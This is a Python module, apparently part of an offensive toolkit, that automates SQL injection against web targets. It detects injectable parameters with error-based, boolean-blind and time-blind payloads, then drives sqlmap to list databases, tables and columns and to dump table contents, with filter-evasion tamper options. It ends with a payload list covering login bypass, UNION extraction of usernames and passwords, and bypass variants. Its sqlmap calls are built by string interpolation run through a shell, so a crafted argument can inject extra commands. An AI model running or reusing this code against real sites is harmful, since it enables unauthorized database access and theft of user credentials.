#!/usr/bin/env python3
# core/sqli_attacker.py
"""SQL注入攻击模块"""

import subprocess
import json
import logging
import os
import re
import time
import requests
from urllib.parse import urlparse, parse_qs, urlunparse
from typing import Dict, List, Optional
from datetime import datetime

logger = logging.getLogger(__name__)


class SQLiAttacker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.timeout = 10
        self.sqlmap_path = self._find_sqlmap()

    def _find_sqlmap(self) -> str:
        paths = ['/usr/bin/sqlmap', '/usr/local/bin/sqlmap', '/usr/share/sqlmap/sqlmap.py']
        for p in paths:
            if os.path.exists(p):
                return p
        try:
            result = subprocess.run(['which', 'sqlmap'], capture_output=True, text=True, timeout=5)
            if result.returncode == 0 and result.stdout.strip():
                return result.stdout.strip()
        except Exception:
            pass
        return 'sqlmap'

    # ================================================================
    #  注入点检测
    # ================================================================

    def detect_injection_points(self, target_url: str, method: str = "GET",
                                params: Dict = None, data: Dict = None,
                                cookie: str = None) -> Dict:
        """检测SQL注入点"""
        result = {
            "target": target_url, "method": method, "injection_points": [],
            "vulnerable": False, "db_type": None,
            "timestamp": datetime.now().isoformat()
        }
        try:
            logger.info(f"[SQLi检测] {target_url}")
            test_params = {}
            if method.upper() == "GET":
                parsed = urlparse(target_url)
                test_params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
                if params:
                    test_params.update(params)
            else:
                test_params = data or {}

            if not test_params:
                test_params = self._auto_discover_params(target_url)
                if not test_params:
                    result["error"] = "未发现可测试参数，请手动指定"
                    return result

            for param_name, param_value in test_params.items():
                point = self._test_parameter(target_url, method, param_name, param_value, test_params, cookie)
                if point["vulnerable"]:
                    result["injection_points"].append(point)

            result["vulnerable"] = len(result["injection_points"]) > 0
            if result["vulnerable"]:
                result["db_type"] = self._identify_db_type(result["injection_points"])
        except Exception as e:
            logger.error(f"[SQLi检测] 异常: {e}")
            result["error"] = str(e)
        return result

    def _auto_discover_params(self, url: str) -> Dict:
        params = {}
        try:
            resp = self.session.get(url, timeout=self.timeout, verify=False)
            for p in re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', resp.text):
                params[p] = '1'
        except Exception:
            pass
        return params

    def _test_parameter(self, url: str, method: str, param_name: str, param_value: str,
                        all_params: Dict, cookie: str = None) -> Dict:
        point = {
            "parameter": param_name, "method": method, "vulnerable": False,
            "injection_types": [], "payloads": [], "db_errors": []
        }
        baseline = self._send_request(url, method, all_params, cookie)
        if not baseline:
            return point

        # 1. 错误注入检测
        error_payloads = [
            ("'", "单引号"), ('"', "双引号"),
            ("' OR '1'='1", "OR注入"), ("' OR '1'='1' --", "OR注入+注释"),
            ("1' ORDER BY 1--", "ORDER BY"), ("1 UNION SELECT NULL--", "UNION SELECT"),
        ]
        for payload, desc in error_payloads:
            test_params = all_params.copy()
            test_params[param_name] = str(param_value) + payload
            resp = self._send_request(url, method, test_params, cookie)
            if resp:
                errors = self._check_sql_errors(resp.text)
                if errors:
                    point["vulnerable"] = True
                    if "error_based" not in point["injection_types"]:
                        point["injection_types"].append("error_based")
                    point["payloads"].append({"payload": payload, "type": "error_based", "desc": desc})
                    point["db_errors"].extend(errors)

        # 2. 布尔盲注检测
        true_params = all_params.copy()
        true_params[param_name] = str(param_value) + "' OR '1'='1"
        true_resp = self._send_request(url, method, true_params, cookie)
        false_params = all_params.copy()
        false_params[param_name] = str(param_value) + "' OR '1'='2"
        false_resp = self._send_request(url, method, false_params, cookie)

        if true_resp and false_resp:
            if len(true_resp.text) != len(false_resp.text) and abs(len(true_resp.text) - len(baseline.text)) > 50:
                point["vulnerable"] = True
                if "boolean_blind" not in point["injection_types"]:
                    point["injection_types"].append("boolean_blind")
                point["payloads"].append({"payload": "' OR '1'='1", "type": "boolean_blind", "desc": "布尔盲注"})

        # 3. 时间盲注检测
        time_payloads = [
            ("' OR SLEEP(3)--", "MySQL SLEEP"),
            ("'; WAITFOR DELAY '0:0:3'--", "MSSQL WAITFOR"),
            ("' OR pg_sleep(3)--", "PostgreSQL pg_sleep"),
        ]
        for payload, desc in time_payloads:
            test_params = all_params.copy()
            test_params[param_name] = str(param_value) + payload
            start = time.time()
            self._send_request(url, method, test_params, cookie, timeout=15)
            elapsed = time.time() - start
            if elapsed >= 2.5:
                point["vulnerable"] = True
                if "time_blind" not in point["injection_types"]:
                    point["injection_types"].append("time_blind")
                point["payloads"].append({"payload": payload, "type": "time_blind", "desc": f"{desc} ({elapsed:.1f}s)"})
                break

        point["db_errors"] = list(set(point["db_errors"]))
        return point

    def _send_request(self, url: str, method: str, params: Dict,
                      cookie: str = None, timeout: int = None) -> Optional[requests.Response]:
        try:
            headers = {'Cookie': cookie} if cookie else {}
            if method.upper() == "GET":
                parsed = urlparse(url)
                base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', '', ''))
                return self.session.get(base_url, params=params, headers=headers,
                                        timeout=timeout or self.timeout, verify=False)
            else:
                return self.session.post(url, data=params, headers=headers,
                                         timeout=timeout or self.timeout, verify=False)
        except Exception:
            return None

    def _check_sql_errors(self, text: str) -> List[str]:
        errors = []
        patterns = {
            "MySQL": [r"SQL syntax.*?MySQL", r"Warning.*?mysql_", r"MySQLSyntaxErrorException",
                      r"check the manual that corresponds to your MySQL"],
            "PostgreSQL": [r"PostgreSQL.*?ERROR", r"Warning.*?\Wpg_", r"PG::SyntaxError",
                           r"ERROR:\s+syntax error at or near"],
            "MSSQL": [r"Driver.*? SQL[\-\_\ ]*Server", r"OLE DB.*? SQL Server",
                      r"System\.Data\.SqlClient\.", r"Unclosed quotation mark"],
            "Oracle": [r"\bORA-\d{5}", r"Oracle error", r"Warning.*?\Woci_"],
            "SQLite": [r"SQLite\.Exception", r"Warning.*?sqlite_", r"SQLITE_ERROR"]
        }
        for db_type, pats in patterns.items():
            for pat in pats:
                if re.search(pat, text, re.IGNORECASE):
                    errors.append(db_type)
                    break
        return errors

    def _identify_db_type(self, injection_points: List[Dict]) -> str:
        db_counts = {}
        for point in injection_points:
            for err in point.get("db_errors", []):
                db_counts[err] = db_counts.get(err, 0) + 1
        if db_counts:
            return max(db_counts, key=db_counts.get)
        # 根据时间盲注payload推断
        for point in injection_points:
            for p in point.get("payloads", []):
                if "SLEEP" in p.get("payload", ""):
                    return "MySQL"
                if "WAITFOR" in p.get("payload", ""):
                    return "MSSQL"
                if "pg_sleep" in p.get("payload", ""):
                    return "PostgreSQL"
        return "Unknown"

    # ================================================================
    #  sqlmap自动化攻击
    # ================================================================

    def run_sqlmap_scan(self, target_url: str, method: str = "GET",
                       data: str = None, cookie: str = None,
                       level: int = 3, risk: int = 2,
                       technique: str = None, tamper: str = None,
                       extra_args: str = None) -> Dict:
        """使用sqlmap执行自动化SQL注入扫描"""
        result = {
            "target": target_url, "success": False,
            "vulnerabilities": [], "databases": [],
            "output": "", "timestamp": datetime.now().isoformat()
        }
        try:
            cmd = f"{self.sqlmap_path} -u \"{target_url}\" --batch --output-dir=/tmp/sqlmap_output"
            cmd += f" --level={level} --risk={risk}"

            if method.upper() == "POST" and data:
                cmd += f" --method=POST --data=\"{data}\""
            if cookie:
                cmd += f" --cookie=\"{cookie}\""
            if technique:
                cmd += f" --technique={technique}"
            if tamper:
                cmd += f" --tamper={tamper}"
            if extra_args:
                cmd += f" {extra_args}"

            cmd += " --threads=4 --timeout=30"

            logger.info(f"[sqlmap] 执行: {cmd}")
            output = self._run_command(cmd, timeout=600)
            result["output"] = output

            # 解析结果
            if "is vulnerable" in output or "injectable" in output:
                result["success"] = True
                result["vulnerabilities"] = self._parse_sqlmap_vulns(output)
            if "available databases" in output:
                result["databases"] = self._parse_sqlmap_databases(output)

        except Exception as e:
            logger.error(f"[sqlmap] 异常: {e}")
            result["error"] = str(e)
        return result

    def sqlmap_get_databases(self, target_url: str, cookie: str = None) -> Dict:
        """获取数据库列表"""
        result = {"success": False, "databases": [], "output": ""}
        try:
            cmd = f"{self.sqlmap_path} -u \"{target_url}\" --batch --dbs --threads=4"
            if cookie:
                cmd += f" --cookie=\"{cookie}\""
            output = self._run_command(cmd, timeout=300)
            result["output"] = output
            result["databases"] = self._parse_sqlmap_databases(output)
            result["success"] = len(result["databases"]) > 0
        except Exception as e:
            result["error"] = str(e)
        return result

    def sqlmap_get_tables(self, target_url: str, database: str, cookie: str = None) -> Dict:
        """获取指定数据库的表列表"""
        result = {"success": False, "tables": [], "output": ""}
        try:
            cmd = f"{self.sqlmap_path} -u \"{target_url}\" --batch -D {database} --tables --threads=4"
            if cookie:
                cmd += f" --cookie=\"{cookie}\""
            output = self._run_command(cmd, timeout=300)
            result["output"] = output
            result["tables"] = self._parse_sqlmap_tables(output)
            result["success"] = len(result["tables"]) > 0
        except Exception as e:
            result["error"] = str(e)
        return result

    def sqlmap_get_columns(self, target_url: str, database: str, table: str, cookie: str = None) -> Dict:
        """获取指定表的列信息"""
        result = {"success": False, "columns": [], "output": ""}
        try:
            cmd = f"{self.sqlmap_path} -u \"{target_url}\" --batch -D {database} -T {table} --columns --threads=4"
            if cookie:
                cmd += f" --cookie=\"{cookie}\""
            output = self._run_command(cmd, timeout=300)
            result["output"] = output
            result["columns"] = self._parse_sqlmap_columns(output)
            result["success"] = len(result["columns"]) > 0
        except Exception as e:
            result["error"] = str(e)
        return result

    def sqlmap_dump_data(self, target_url: str, database: str, table: str,
                        columns: str = None, cookie: str = None, limit: int = 50) -> Dict:
        """提取数据"""
        result = {"success": False, "data": [], "output": ""}
        try:
            cmd = f"{self.sqlmap_path} -u \"{target_url}\" --batch -D {database} -T {table}"
            if columns:
                cmd += f" -C {columns}"
            cmd += f" --dump --threads=4 --stop={limit}"
            if cookie:
                cmd += f" --cookie=\"{cookie}\""
            output = self._run_command(cmd, timeout=600)
            result["output"] = output
            result["data"] = self._parse_sqlmap_dump(output)
            result["success"] = len(result["data"]) > 0
        except Exception as e:
            result["error"] = str(e)
        return result

    # ================================================================
    #  手动Payload测试
    # ================================================================

    def test_custom_payload(self, target_url: str, method: str, param_name: str,
                            payload: str, params: Dict = None, cookie: str = None) -> Dict:
        """测试自定义SQL注入payload"""
        result = {
            "payload": payload, "parameter": param_name,
            "success": False, "response_code": None,
            "response_length": 0, "response_time": 0,
            "errors_found": [], "response_preview": ""
        }
        try:
            test_params = params.copy() if params else {}
            test_params[param_name] = payload

            start = time.time()
            resp = self._send_request(target_url, method, test_params, cookie, timeout=15)
            result["response_time"] = round(time.time() - start, 2)

            if resp:
                result["response_code"] = resp.status_code
                result["response_length"] = len(resp.text)
                result["errors_found"] = self._check_sql_errors(resp.text)
                result["response_preview"] = resp.text[:500]
                result["success"] = True
        except Exception as e:
            result["error"] = str(e)
        return result

    # ================================================================
    #  sqlmap输出解析
    # ================================================================

    def _run_command(self, cmd: str, timeout: int = 300) -> str:
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return ""
        except Exception as e:
            logger.error(f"命令执行失败: {e}")
            return ""

    def _parse_sqlmap_vulns(self, output: str) -> List[Dict]:
        vulns = []
        # 匹配注入类型
        type_pattern = r"Type:\s*(.+?)(?:\n|Title:)"
        title_pattern = r"Title:\s*(.+)"
        payload_pattern = r"Payload:\s*(.+)"

        types = re.findall(type_pattern, output)
        titles = re.findall(title_pattern, output)
        payloads = re.findall(payload_pattern, output)

        for i in range(min(len(types), len(titles))):
            vuln = {
                "type": types[i].strip() if i < len(types) else "unknown",
                "title": titles[i].strip() if i < len(titles) else "",
                "payload": payloads[i].strip() if i < len(payloads) else ""
            }
            vulns.append(vuln)

        if not vulns and ("is vulnerable" in output or "injectable" in output):
            vulns.append({"type": "detected", "title": "SQL injection detected", "payload": ""})
        return vulns

    def _parse_sqlmap_databases(self, output: str) -> List[str]:
        dbs = []
        in_db_section = False
        for line in output.split('\n'):
            if 'available databases' in line.lower():
                in_db_section = True
                continue
            if in_db_section:
                line = line.strip()
                if line.startswith('[*]'):
                    db_name = line.replace('[*]', '').strip()
                    if db_name:
                        dbs.append(db_name)
                elif line and not line.startswith('[') and not line.startswith('-'):
                    if line not in ['', '+', '|']:
                        dbs.append(line)
                elif not line:
                    if dbs:
                        break
        return dbs

    def _parse_sqlmap_tables(self, output: str) -> List[str]:
        tables = []
        in_table_section = False
        for line in output.split('\n'):
            if 'Database:' in line:
                in_table_section = True
                continue
            if in_table_section:
                line = line.strip()
                if line.startswith('|'):
                    table_name = line.strip('| ').strip()
                    if table_name and table_name != '-' * len(table_name):
                        tables.append(table_name)
                elif line.startswith('[') and 'table' in line.lower():
                    continue
                elif not line and tables:
                    break
        return tables

    def _parse_sqlmap_columns(self, output: str) -> List[Dict]:
        columns = []
        in_col_section = False
        for line in output.split('\n'):
            if 'Column' in line and 'Type' in line:
                in_col_section = True
                continue
            if in_col_section:
                line = line.strip()
                if line.startswith('|'):
                    parts = [p.strip() for p in line.strip('|').split('|')]
                    if len(parts) >= 2 and parts[0] != '-' * len(parts[0]):
                        columns.append({"name": parts[0], "type": parts[1] if len(parts) > 1 else "unknown"})
                elif not line and columns:
                    break
        return columns

    def _parse_sqlmap_dump(self, output: str) -> List[Dict]:
        data = []
        headers = []
        in_data_section = False
        for line in output.split('\n'):
            line = line.strip()
            if line.startswith('|') and not in_data_section:
                parts = [p.strip() for p in line.strip('|').split('|')]
                if all(p and p != '-' * len(p) for p in parts):
                    headers = parts
                    in_data_section = True
                continue
            if in_data_section and line.startswith('|'):
                parts = [p.strip() for p in line.strip('|').split('|')]
                if parts and parts[0] != '-' * len(parts[0]):
                    row = {}
                    for i, h in enumerate(headers):
                        row[h] = parts[i] if i < len(parts) else ""
                    data.append(row)
            elif in_data_section and not line.startswith('+') and not line.startswith('|'):
                if data:
                    break
        return data

    # ================================================================
    #  常用Payload列表
    # ================================================================

    def get_common_payloads(self) -> List[Dict]:
        """返回常用SQL注入payload列表"""
        return [
            {"category": "基础检测", "payloads": [
                {"payload": "'", "desc": "单引号测试"},
                {"payload": "\"", "desc": "双引号测试"},
                {"payload": "' OR '1'='1", "desc": "经典OR注入"},
                {"payload": "' OR '1'='1' --", "desc": "OR注入+注释"},
                {"payload": "' OR 1=1 #", "desc": "MySQL注释"},
                {"payload": "admin' --", "desc": "登录绕过"},
            ]},
            {"category": "UNION注入", "payloads": [
                {"payload": "' UNION SELECT NULL--", "desc": "UNION 1列"},
                {"payload": "' UNION SELECT NULL,NULL--", "desc": "UNION 2列"},
                {"payload": "' UNION SELECT NULL,NULL,NULL--", "desc": "UNION 3列"},
                {"payload": "' UNION SELECT 1,2,3--", "desc": "UNION数字"},
                {"payload": "' UNION SELECT username,password FROM users--", "desc": "提取用户表"},
            ]},
            {"category": "信息收集", "payloads": [
                {"payload": "' UNION SELECT @@version--", "desc": "数据库版本(MySQL/MSSQL)"},
                {"payload": "' UNION SELECT version()--", "desc": "数据库版本(PostgreSQL)"},
                {"payload": "' UNION SELECT database()--", "desc": "当前数据库(MySQL)"},
                {"payload": "' UNION SELECT current_user()--", "desc": "当前用户"},
                {"payload": "' UNION SELECT table_name FROM information_schema.tables--", "desc": "列出所有表"},
            ]},
            {"category": "时间盲注", "payloads": [
                {"payload": "' OR SLEEP(5)--", "desc": "MySQL延时"},
                {"payload": "'; WAITFOR DELAY '0:0:5'--", "desc": "MSSQL延时"},
                {"payload": "' OR pg_sleep(5)--", "desc": "PostgreSQL延时"},
                {"payload": "' OR BENCHMARK(10000000,SHA1('test'))--", "desc": "MySQL BENCHMARK"},
            ]},
            {"category": "绕过技术", "payloads": [
                {"payload": "' oR '1'='1", "desc": "大小写混淆"},
                {"payload": "'/**/OR/**/1=1--", "desc": "注释绕过"},
                {"payload": "' OR 0x31=0x31--", "desc": "十六进制编码"},
                {"payload": "' OR CHAR(49)=CHAR(49)--", "desc": "CHAR函数"},
            ]},
        ]

    def get_tamper_scripts(self) -> List[Dict]:
        """返回可用的sqlmap tamper脚本列表"""
        return [
            {"name": "space2comment", "desc": "用注释替换空格"},
            {"name": "between", "desc": "用BETWEEN替换大于号"},
            {"name": "randomcase", "desc": "随机大小写"},
            {"name": "charencode", "desc": "URL编码"},
            {"name": "equaltolike", "desc": "用LIKE替换等号"},
            {"name": "base64encode", "desc": "Base64编码"},
            {"name": "apostrophemask", "desc": "UTF-8编码单引号"},
            {"name": "multiplespaces", "desc": "多空格混淆"},
        ]